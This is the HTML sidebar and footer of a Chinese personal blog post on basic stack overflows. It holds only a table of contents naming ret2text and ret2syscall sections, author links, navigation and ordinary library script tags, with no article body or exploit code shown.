class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E6%80%8E%E4%B9%88%E5%B0%B1%E6%BA%A2%E5%87%BA%E4%BA%86"><span class="toc-number">1.</span> <span class="toc-text">栈怎么就溢出了</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%98%E6%9C%89%E8%BF%94%E5%9B%9E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88"><span class="toc-number">1.1.</span> <span class="toc-text">函数的调用还有返回发生了什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%A0%88%E5%A1%9E%E4%B8%8D%E4%B8%8B%E4%BA%86"><span class="toc-number">1.2.</span> <span class="toc-text">如果栈塞不下了……</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%83%BD%E4%B8%8D%E8%83%BD%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">能不能利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E6%98%AF%E4%B8%8D%E6%98%AF%E5%87%BA%E9%97%AE%E9%A2%98%E4%BA%86"><span class="toc-number">2.1.</span> <span class="toc-text">控制流是不是出问题了？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E6%9C%89%E8%BE%93%E5%85%A5%E7%9A%84%E8%AF%9D%E7%84%B6%E5%90%8Eret2text"><span class="toc-number">2.2.</span> <span class="toc-text">如果有输入的话，然后 ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E5%AE%9E%E4%B8%8A%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E5%85%B3%E9%97%AD%E4%BA%86"><span class="toc-number">2.3.</span> <span class="toc-text">事实上安全检查关闭了</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%98%AFret2text"><span class="toc-number">3.</span> <span class="toc-text">如果不是 ret2text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%B4%E8%BF%9B%E4%B8%80%E6%AD%A5ret2syscall"><span class="toc-number">4.</span> <span class="toc-text">更进一步，ret2syscall</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">参考资料</span></a></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li class="active"><a href="/2022/03/28/stackoverflow-learn/" rel="bookmark" title="关于栈溢出的一些东西（基本的）">关于栈溢出的一些东西（基本的）</a></li><li><a href="/2022/03/30/stackoverflow-ret2libc/" rel="bookmark" title="栈溢出，ret2libc">栈溢出，ret2libc</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" loading="lazy" decoding="async" itemprop="image" alt="神隐陌路/symlPigeon" src="/assets/avatar.png"><p class="name" itemprop="name">神隐陌路/symlPigeon</p><div class="description" itemprop="description">夢違え、幻の朝靄の世界の記憶を</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">50</span><span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">36</span><span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">45</span><span class="name">标签</span></a></div></nav><div class="social"><a target="_blank" rel="noopener" href="https://github.com/symlpigeon" class="item github" title="https:&#x2F;&#x2F;github.com&#x2F;symlpigeon"><i class="ic i-github"></i></a><a target="_blank" rel="noopener" href="https://music.163.com/#/user/home?id=540913144" class="item music" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;540913144"><i class="ic i-cloud-music"></i></a><a href="mailto:2163953074@qq.com" class="item email" title="mailto:2163953074@qq.com"><i class="ic i-envelope"></i></a><a target="_blank" rel="noopener" href="https://stackoverflow.com/users/20091462/symlpigeon" class="item stackoverflow" title="https:&#x2F;&#x2F;stackoverflow.com&#x2F;users&#x2F;20091462&#x2F;symlpigeon"><i class="ic i-stack-overflow"></i></a></div><div class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="#" onclick="return!1"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/statistics/" rel="section"><i class="ic i-clock"></i>统计</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a></li></div></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2022/03/30/stackoverflow-ret2libc/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2022/03/23/mpc-gmw/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"></div><div class="status"><div class="copyright">&copy; 2021 -<span itemprop="copyrightYear">2025</span><span class="with-love"><i class="ic i-sakura rotate"></i></span><span class="author" itemprop="copyrightHolder">神隐陌路/symlPigeon @ Another Gensokyo</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i></span><span title="站点总字数">421k 字</span><span class="post-meta-divider"> | </span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">6:22</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div><script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script><div id="busuanzi-wrap"><span class="ic i-eye"></span><span id="busuanzi_container_site_pv">本站访问量 <span id="busuanzi_value_site_pv"></span> 次</span> | <span class="ic i-user"></span><span id="busuanzi_container_site_uv">本站访客量 <span id="busuanzi_value_site_uv"></span> 次</span></div></div></footer></div><script data-config type="text/javascript">var LOCAL={ispost:!0,path:"2022/03/28/stackoverflow-learn/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},nocopy:"false",nocopy:!1,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',copy_tex:!0,katex:!0,mermaid:!1,audio:void 0,fancybox:!0,outime:!0,template:'<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>',quiz:{choice:"单选题",multiple:"多选题",true_false:"判断题",essay:"问答题",gap_fill:"填空题",mistake:"错题备注"},ignores:[e=>e.includes("#"),e=>new RegExp(LOCAL.path+"$").test(e),[]]}</script><script src="undefined/undefined" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha384-ZvpUoO&#x2F;+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn&#x2F;6Z&#x2F;hRTt8+pR6L4N2" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha384-Zm+UU4tdcfAm29vg+MTbfu&#x2F;&#x2F;q5B&#x2F;lInMbMCr4T8c9rQFyOv6PlfQYpB5wItcXWe7" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" integrity="sha384-TOxsBplaL96&#x2F;QDWPIUg+ye3v89qSE3s22XNtJMmCeZEep3cVDmXy1zEfZvVv+y2m" crossorigin="anonymous" fetchpriority="high"></script><script src="/js/siteInit.js?v=0.4.25" type="module" fetchpriority="high" defer></script></body></html><!-- rebuild by hexo-renderer-multi-next-markdown-it -->